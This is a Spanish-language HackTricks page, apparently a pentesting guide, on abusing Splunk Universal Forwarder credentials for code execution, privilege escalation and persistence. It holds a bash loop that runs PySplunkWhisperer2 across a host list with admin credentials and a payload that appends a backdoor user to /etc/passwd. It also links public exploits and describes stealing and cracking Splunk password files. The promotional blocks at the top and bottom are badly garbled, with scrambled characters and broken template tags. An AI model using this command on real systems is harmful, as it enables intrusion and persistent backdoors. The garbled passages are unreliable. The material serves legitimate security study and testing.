# Splunk LPE y Persistencia

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

Si **enumerando** una máquina **internamente** o **externamente** encuentras **Splunk en ejecución** (puerto 8090), si tienes la suerte de conocer alguna **credencial válida** puedes **abusar del servicio Splunk** para **ejecutar un shell** como el usuario que ejecuta Splunk. Si root lo está ejecutando, puedes escalar privilegios a root.

Además, si ya eres root y el servicio Splunk no está escuchando solo en localhost, puedes **robar** el **archivo** de **contraseñas** **del** servicio Splunk y **crackear** las contraseñas, o **agregar nuevas** credenciales a él. Y mantener persistencia en el host.

En la primera imagen a continuación puedes ver cómo se ve una página web de Splunkd.

## Resumen de la Explotación del Agente Universal Forwarder de Splunk

Para más detalles, consulta la publicación [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Este es solo un resumen:

**Descripción de la Explotación:**
Una explotación dirigida al Agente Universal Forwarder de Splunk (UF) permite a los atacantes con la contraseña del agente ejecutar código arbitrario en sistemas que ejecutan el agente, comprometiendo potencialmente toda una red.

**Puntos Clave:**
- El agente UF no valida las conexiones entrantes ni la autenticidad del código, lo que lo hace vulnerable a la ejecución no autorizada de código.
- Los métodos comunes de adquisición de contraseñas incluyen localizarlas en directorios de red, comparticiones de archivos o documentación interna.
- La explotación exitosa puede llevar a acceso a nivel de SYSTEM o root en hosts comprometidos, exfiltración de datos y mayor infiltración en la red.

**Ejecución de la Explotación:**
1. El atacante obtiene la contraseña del agente UF.
2. Utiliza la API de Splunk para enviar comandos o scripts a los agentes.
3. Las acciones posibles incluyen extracción de archivos, manipulación de cuentas de usuario y compromiso del sistema.

**Impacto:**
- Compromiso total de la red con permisos a nivel de SYSTEM/root en cada host.
- Potencial para deshabilitar el registro para evadir la detección.
- Instalación de puertas traseras o ransomware.

**Ejemplo de Comando para la Explotación:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits públicos utilizables:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Abusando de Consultas de Splunk

**Para más detalles, consulta la publicación [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
